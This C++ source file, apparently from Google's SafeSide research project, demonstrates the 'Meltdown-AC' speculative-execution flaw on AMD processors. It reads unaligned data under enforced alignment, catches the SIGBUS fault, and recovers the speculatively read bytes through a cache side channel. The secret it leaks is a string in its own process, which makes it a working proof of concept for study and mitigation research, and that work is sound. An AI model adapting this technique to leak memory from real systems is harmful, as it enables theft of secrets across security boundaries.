/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

/**
 * Demonstrates Meltdown-AC - speculative fetching of unaligned data when
 * alignment is enforced. This vulnerability seems to be AMD-specific. It should
 * not work on Intel CPUs.
 *
 * We create an array of words, shift them by one byte to make them unaligned
 * and then we copy the public and private data into respective unaligned
 * arrays - one character is stored into one unaligned word.
 * Afterwards we turn on the alignment enforcement and try to read the
 * unaligned private array with that enforcement. That always leads to SIGBUS
 * however the unaligned data are processed speculatively.
 * It is necessary to have the AM (alignment mask) in CR0 register turned on,
 * but on Linux it is a standard configuration. If the AM bit is off, the
 * demonstration runs into the unreachable code and terminates with a failure.
 **/

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX
#  error Unsupported OS. Linux required.
#endif

#if !SAFESIDE_IA32 && !SAFESIDE_X64
#  error Unsupported architecture. AMD required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "meltdown_local_content.h"
#include "utils.h"

// Storage for the public data.
// Must be at least a native word size. That's why we pick uintptr_t.
uintptr_t *public_array = new uintptr_t[strlen(public_data) + 1];
// Unaligned array of public data shifted by one byte.
uintptr_t *unaligned_public_data = reinterpret_cast<uintptr_t *>(
    reinterpret_cast<char *>(public_array) + 1);

// Storage for the private data.
uintptr_t *private_array = new uintptr_t[strlen(private_data) + 1];
// Unaligned array of private data shifted by one byte.
uintptr_t *unaligned_private_data = reinterpret_cast<uintptr_t *>(
    reinterpret_cast<char *>(private_array) + 1);

static void InitializeUnalignedData() {
  // Initialize unaligned arrays.
  for (size_t i = 0; i < strlen(public_data); ++i) {
    unaligned_public_data[i] = public_data[i];
  }
  for (size_t i = 0; i < strlen(private_data); ++i) {
    unaligned_private_data[i] = private_data[i];
  }
}

static char LeakByte(uintptr_t *unaligned_data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    // Successful execution accesses safe_offset and loads ForceRead code into
    // cache.
    ForceRead(oracle.data() + unaligned_data[safe_offset]);

    EnforceAlignment();
    MemoryAndSpeculationBarrier();

    // Accesses unaligned data despite of the enforcement. Triggers SIGBUS.
    ForceRead(oracle.data() + unaligned_data[offset]);

    // Architecturally dead code. Never reached unless AM flag in CR0 is off.
    std::cout << "Dead code. Must not be printed. "
              << "Maybe you have to flip on the AM flag in CR0." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGBUS signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    // We must turn off the enforcement for the cache hit computations, because
    // otherwise it would trigger SIGBUS in C++ STL (e.g. strcmp invocations).
    UnenforceAlignment();

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  InitializeUnalignedData();
  OnSignalMoveRipToAfterspeculation(SIGBUS);
  std::cout << "Leaking the string: ";
  std::cout.flush();
  size_t private_offset = unaligned_private_data - unaligned_public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(unaligned_public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
